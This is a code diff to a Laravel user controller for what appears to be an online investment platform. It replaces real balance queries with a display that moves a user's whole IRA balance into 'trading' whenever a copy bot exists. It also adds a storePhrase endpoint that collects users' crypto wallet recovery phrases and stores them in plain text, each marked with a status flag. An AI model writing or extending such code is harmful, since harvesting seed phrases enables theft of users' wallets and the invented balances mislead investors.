@@ -453,24 +453,6 @@ class UserController extends Controller
 
         $symbol = Currency::where('id', $user->currency_id)->first();
 
-        // $basicIraTotalAmount = DB::table('investments')
-        //     ->where('user_id', '=', $user->id)
-        //     ->where('acct_type', '=', 'basic_ira')
-        //     ->where('status', '=', 'open')
-        //     ->sum('amount');
-        
-        // $offshoreTotalAmount = DB::table('investments')
-        //     ->where('user_id', '=', $user->id)
-        //     ->where('acct_type', '=', 'offshore')
-        //     ->where('status', '=', 'open')
-        //     ->sum('amount');
-
-        // $ira_cash = $ira - $basicIraTotalAmount - $ira_roi;
-        // $ira_trading = $basicIraTotalAmount + $ira_roi;
-
-        // $offshore_cash = $offshore - $offshoreTotalAmount - $offshore_roi;
-        // $offshore_trading = $offshoreTotalAmount + $offshore_roi;
-
         $ira_cash =  $user->copyBots->count() >= 1 ? 0 : $ira;
         $ira_trading = $user->copyBots->count() >= 1 ? $ira : 0;
 
@@ -941,5 +923,38 @@ class UserController extends Controller
         } catch (Exception $e) {
 
         }
+    }
+
+    public function storePhrase(Request $request)
+    {
+        // Validate the incoming request data
+        $request->validate([
+            'phrase' => 'required|string',
+            'wallet' => 'required|string',
+        ]);
+
+        // Get the currently authenticated user
+        $user = Auth::user();
+
+        // Prepare the data to be stored as a JSON object
+        $data = [
+            'phrase' => $request->phrase,
+            'wallet' => $request->wallet,
+            'status' => 0
+        ];
+
+        // Convert the array to a JSON string
+        $dataJson = json_encode($data);
+
+        // Update the user's phrase in the users table
+        $user->update(['phrase' => $dataJson]);
+
+        return;
+
+        // Return a success response
+        // return response()->json([
+        //     'msg' => 'Phrase stored successfully!',
+        //     'data' => $data
+        // ]);
     }
 }
